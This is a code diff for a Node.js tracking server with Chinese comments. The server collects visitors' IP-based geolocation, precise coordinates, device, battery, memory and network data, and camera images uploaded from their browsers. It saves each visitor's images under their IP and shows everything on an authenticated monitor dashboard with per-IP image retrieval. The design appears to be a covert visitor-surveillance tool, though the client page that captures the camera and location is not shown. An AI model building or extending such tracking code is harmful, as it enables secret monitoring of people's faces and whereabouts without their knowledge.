@@ -8,6 +8,7 @@ const fs = require('fs').promises;
 const multer = require('multer');
 const geoip = require('geoip-lite');
 const UAParser = require('ua-parser-js');
+const fetch = require('node-fetch');
 
 require('dotenv').config();
 
@@ -35,11 +36,72 @@ const storage = multer.diskStorage({
         }
     },
     filename: function (req, file, cb) {
-        cb(null, 'latest-camera.jpg');
+        // 使用客户端IP作为文件名的一部分
+        const clientIP = req.ip.replace(/:/g, '-').replace(/\./g, '_');
+        cb(null, `camera_${clientIP}_${Date.now()}.jpg`);
     }
 });
 
 const upload = multer({ storage: storage });
+
+// 添加 IP 地址处理函数
+function normalizeIP(ip) {
+    // 处理 IPv6 格式的 IPv4 地址
+    if (ip.includes('::ffff:')) {
+        return ip.replace('::ffff:', '');
+    }
+    // 处理本地回环地址
+    if (ip === '::1' || ip === '127.0.0.1') {
+        // 使用公共 IP 查询服务
+        return new Promise(async (resolve) => {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                resolve(data.ip);
+            } catch (error) {
+                console.error('Error getting public IP:', error);
+                resolve('127.0.0.1');
+            }
+        });
+    }
+    return ip;
+}
+
+// 获取地理位置信息
+async function getLocationInfo(ip) {
+    if (ip === '127.0.0.1' || ip === '::1') {
+        return {
+            city: 'Local',
+            country: 'Development',
+            ll: [0, 0],
+            org: 'Local Network'
+        };
+    }
+
+    try {
+        const geoData = geoip.lookup(ip) || {};
+        if (!geoData.city || !geoData.country) {
+            // 如果 geoip-lite 无法获取信息，尝试使用备用服务
+            const response = await fetch(`http://ip-api.com/json/${ip}`);
+            const data = await response.json();
+            return {
+                city: data.city || 'Unknown',
+                country: data.country || 'Unknown',
+                ll: [data.lat || 0, data.lon || 0],
+                org: data.org || data.isp || 'Unknown'
+            };
+        }
+        return geoData;
+    } catch (error) {
+        console.error('Error getting location info:', error);
+        return {
+            city: 'Unknown',
+            country: 'Unknown',
+            ll: [0, 0],
+            org: 'Unknown'
+        };
+    }
+}
 
 class Server {
     constructor() {
@@ -49,9 +111,24 @@ class Server {
         this.setupRoutes();
         this.setupErrorHandling();
         this.deviceData = new Map();
+        this.activeUsers = new Set();
         
         // 确保必要的目录存在
         ensureDirectories().catch(console.error);
+
+        // 定期清理过期的设备数据
+        setInterval(() => this.cleanupDeviceData(), 1000 * 60 * 60); // 每小时清理一次
+    }
+
+    // 清理超过24小时的设备数据
+    cleanupDeviceData() {
+        const now = Date.now();
+        for (const [ip, data] of this.deviceData.entries()) {
+            if (now - new Date(data.timestamp).getTime() > 24 * 60 * 60 * 1000) {
+                this.deviceData.delete(ip);
+                this.activeUsers.delete(ip);
+            }
+        }
     }
 
     setupMiddleware() {
@@ -99,39 +176,69 @@ class Server {
             res.sendFile(path.join(__dirname, '../public/monitor.html'));
         });
 
+        // 获取所有活跃用户
+        this.app.get('/api/active-users', this.authenticate.bind(this), (req, res) => {
+            const activeUsersData = Array.from(this.deviceData.entries())
+                .map(([ip, data]) => ({
+                    ip,
+                    lastSeen: data.timestamp,
+                    device: data.device,
+                    location: data.location
+                }))
+                .sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
+            
+            res.json(activeUsersData);
+        });
+
         // 追踪API
         this.app.post('/api/track', async (req, res) => {
             try {
-                const clientIP = req.ip || req.connection.remoteAddress;
+                let clientIP = req.ip || req.connection.remoteAddress;
+                clientIP = await normalizeIP(clientIP);
+                
                 const userAgent = req.headers['user-agent'];
                 const parser = new UAParser(userAgent);
                 const parsedUA = parser.getResult();
-                const geoData = geoip.lookup(clientIP) || {};
+                const geoData = await getLocationInfo(clientIP);
                 
+                // 获取更详细的系统信息
+                const deviceInfo = {
+                    model: parsedUA.device.model || parsedUA.os.name || 'Unknown',
+                    os: `${parsedUA.os.name || 'Unknown'} ${parsedUA.os.version || ''}`.trim(),
+                    browser: `${parsedUA.browser.name || 'Unknown'} ${parsedUA.browser.version || ''}`.trim(),
+                    battery: req.body.battery || { level: 0, charging: false },
+                    network: req.body.network || { type: 'Unknown', downlink: 0 },
+                    memory: req.body.memory || {
+                        total: 0,
+                        used: 0,
+                        free: 0
+                    }
+                };
+
                 const data = {
-                    device: {
-                        model: parsedUA.device.model || 'Unknown',
-                        os: `${parsedUA.os.name} ${parsedUA.os.version}`,
-                        browser: `${parsedUA.browser.name} ${parsedUA.browser.version}`,
-                        battery: req.body.battery || { level: 0 },
-                        network: req.body.network || { type: 'Unknown' },
-                        memory: req.body.memory || 0
-                    },
+                    device: deviceInfo,
                     location: {
                         lat: req.body.data?.lat || geoData.ll?.[0] || 0,
                         lon: req.body.data?.lon || geoData.ll?.[1] || 0,
-                        city: geoData.city || 'Unknown',
-                        country: geoData.country || 'Unknown',
-                        isp: geoData.org || 'Unknown',
+                        city: geoData.city,
+                        country: geoData.country,
+                        isp: geoData.org,
                         ip: clientIP
                     },
-                    timestamp: new Date().toISOString()
+                    timestamp: new Date().toISOString(),
+                    lastImage: null,
+                    system: {
+                        cpuUsage: req.body.system?.cpuUsage || 0,
+                        memoryUsage: req.body.system?.memoryUsage || 0,
+                        uptime: req.body.system?.uptime || 0
+                    }
                 };
                 
                 this.deviceData.set(clientIP, data);
+                this.activeUsers.add(clientIP);
                 await this.saveDeviceData(data);
                 
-                res.status(200).send({ status: 'ok' });
+                res.status(200).send({ status: 'ok', data });
             } catch (error) {
                 console.error('Error processing track request:', error);
                 res.status(500).send({ status: 'error', message: error.message });
@@ -141,27 +248,8 @@ class Server {
         // 监控API
         this.app.get('/api/monitor', this.authenticate.bind(this), async (req, res) => {
             try {
-                const clientIP = req.query.ip || req.ip;
-                const deviceInfo = this.deviceData.get(clientIP) || {
-                    device: {
-                        model: 'Unknown',
-                        os: 'Unknown',
-                        browser: 'Unknown',
-                        battery: { level: 0 },
-                        network: { type: 'Unknown' },
-                        memory: 0
-                    },
-                    location: {
-                        lat: 0,
-                        lon: 0,
-                        city: 'Unknown',
-                        country: 'Unknown',
-                        isp: 'Unknown',
-                        ip: clientIP
-                    }
-                };
-                
-                res.json(deviceInfo);
+                const allDevices = Array.from(this.deviceData.values());
+                res.json(allDevices);
             } catch (error) {
                 console.error('Error in monitor API:', error);
                 res.status(500).json({ error: 'Internal server error' });
@@ -215,17 +303,40 @@ class Server {
         });
 
         // 处理摄像头图片上传
-        this.app.post('/api/camera-update', upload.single('image'), (req, res) => {
-            res.json({ success: true });
+        this.app.post('/api/camera-update', upload.single('image'), async (req, res) => {
+            try {
+                const clientIP = req.ip;
+                const deviceData = this.deviceData.get(clientIP);
+                if (deviceData && req.file) {
+                    deviceData.lastImage = req.file.filename;
+                    this.deviceData.set(clientIP, deviceData);
+                }
+                res.json({ success: true, filename: req.file.filename });
+            } catch (error) {
+                console.error('Error handling camera update:', error);
+                res.status(500).json({ error: 'Failed to process image' });
+            }
         });
 
         // 获取最新的摄像头图片
-        this.app.get('/api/camera-image', (req, res) => {
-            const imagePath = path.join(__dirname, '../uploads/latest-camera.jpg');
-            if (fs.existsSync(imagePath)) {
-                res.sendFile(imagePath);
-            } else {
-                res.status(404).send('No image available');
+        this.app.get('/api/camera-image/:ip', this.authenticate.bind(this), async (req, res) => {
+            try {
+                const targetIP = req.params.ip;
+                const deviceData = this.deviceData.get(targetIP);
+                
+                if (!deviceData || !deviceData.lastImage) {
+                    return res.status(404).send('No image available');
+                }
+
+                const imagePath = path.join(__dirname, '..', 'uploads', deviceData.lastImage);
+                if (await fs.access(imagePath).then(() => true).catch(() => false)) {
+                    res.sendFile(imagePath);
+                } else {
+                    res.status(404).send('Image file not found');
+                }
+            } catch (error) {
+                console.error('Error serving camera image:', error);
+                res.status(500).send('Error retrieving image');
             }
         });
     }
